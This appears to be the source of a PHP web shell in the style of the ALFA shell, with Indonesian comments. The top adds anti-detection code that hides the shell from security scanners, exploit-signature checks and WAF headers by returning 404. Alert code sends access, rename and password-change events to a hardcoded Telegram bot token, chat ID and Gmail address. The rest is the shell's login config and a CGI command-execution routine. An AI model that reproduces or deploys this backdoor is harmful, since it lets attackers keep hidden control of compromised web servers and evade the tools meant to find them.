	<?php
	// =============== PROTEKSI ANTI-DETEKSI ================= //

	// 1. 🧤 Anti Scanner (User-Agent)
	$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
	$blacklist_agents = ['sqlmap', 'curl', 'python', 'wget', 'httpclient', 'scan', 'nikto', 'nmap', 'bot', 'crawler'];
	foreach ($blacklist_agents as $agent) {
		if (strpos($user_agent, $agent) !== false) {
			header("HTTP/1.0 404 Not Found"); exit;
		}
	}
	// 2. 💣 Payload/Signature Detection (anti exploit/malware scanner)
	$signatures = ['eval', 'system', 'exec', 'shell_exec', 'base64_', 'php://', 'input', 'assert', 'passthru', 'proc_open', 'popen'];
	foreach ($_REQUEST as $key => $value) {
		foreach ($signatures as $sig) {
			if (stripos($key, $sig) !== false || stripos($value, $sig) !== false) {
				header("HTTP/1.0 404 Not Found"); exit;
			}
		}
	}
	// 3. 🧱 WAF/Firewall Header Detection
	$headers = getallheaders();
	$waf_signs = ['x-sucuri-id', 'x-imunify360', 'x-mod-security', 'cf-ray', 'x-waf', 'x-fireeye', 'x-barikode'];
	foreach ($headers as $key => $value) {
		foreach ($waf_signs as $sign) {
			if (stripos($key, $sign) !== false || stripos($value, $sign) !== false) {
				header("HTTP/1.0 404 Not Found"); exit;
			}
		}
	}
	...
	// === Konfigurasi ===
	$botToken = "8181746392:AAGPhXAWAhmuWCE9dRNZK2sQKZA5qdU8z04";
	$chatId = "1918141663";
	$emailTujuan = "kasatmata404@gmail.com";
	$passwordDefault = 'silent404'; // Password asli yang ingin dipantau
	$shellPath = __FILE__;
	...
	// === Lokasi penyimpanan data session (tidak terlihat di folder shell) ===
	$tempFile = sys_get_temp_dir() . "/.notifikasi_{$hash}";

	// === Fungsi kirim notifikasi ===
	function kirim_notifikasi($pesan) {
		global $emailTujuan, $botToken, $chatId;
		@mail($emailTujuan, "Shell Notification", $pesan);
		$pesanUrl = urlencode($pesan);
		@file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$pesanUrl}");
	}

	// === Cek perubahan nama file shell ===
	$namaSebelumnyaFile = sys_get_temp_dir() . "/.last_shellname";
	if (!file_exists($namaSebelumnyaFile)) {
		file_put_contents($namaSebelumnyaFile, $shellName);
	} else {
		$lastName = trim(file_get_contents($namaSebelumnyaFile));
		if ($lastName !== $shellName) {
			kirim_notifikasi("⚠️ Nama shell telah diubah!\nIP: $ip\nWaktu: $waktu\nNama baru: $shellName\nFolder: $dirName");
			file_put_contents($namaSebelumnyaFile, $shellName);
		}
	}

	// === Cek perubahan password shell ===
	$passwordLogFile = sys_get_temp_dir() . "/.shell_pass_hash";
	$currentPassHash = md5($passwordDefault); // Ganti jika password tersimpan dalam bentuk hash yang lain
	if (!file_exists($passwordLogFile)) {
		file_put_contents($passwordLogFile, $currentPassHash);
	} else {
		$lastPassHash = trim(file_get_contents($passwordLogFile));
		if ($lastPassHash !== $currentPassHash) {
			kirim_notifikasi("⚠️ Password shell telah diubah!\nIP: $ip\nWaktu: $waktu\nShell: $shellName");
			file_put_contents($passwordLogFile, $currentPassHash);
		}
	}

	// === Kirim notifikasi akses hanya setiap 2 jam per IP ===
	$lastTime = 0;
	if (file_exists($tempFile)) {
		$lastTime = (int)file_get_contents($tempFile);
	}
	if (($now - $lastTime) >= 7200) {
		$pesan = "💻 Shell accessed\nIP: $ip\nTime: $waktu\nFile: $shellName\nFolder: $dirName";
		kirim_notifikasi($pesan);
		file_put_contents($tempFile, $now);
	}
	?>
	<?php
	$password = "silent404";
	...
	*/
	...
	$GLOBALS['oZgNypoPRU'] = array(
		'username' => 'alfa',
		'password' => '845be811ca7a5cf95680e378b3b1f81e',//md5(silent404)
		'safe_mode' => '0',
		'login_page' => '403',
		'show_icons' => '1',
	...
	function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
		...
		if($is_curl||$is_socket){
			...
			$cgi_url = "./alfacgiapi/".$lang.$cgi_ext;
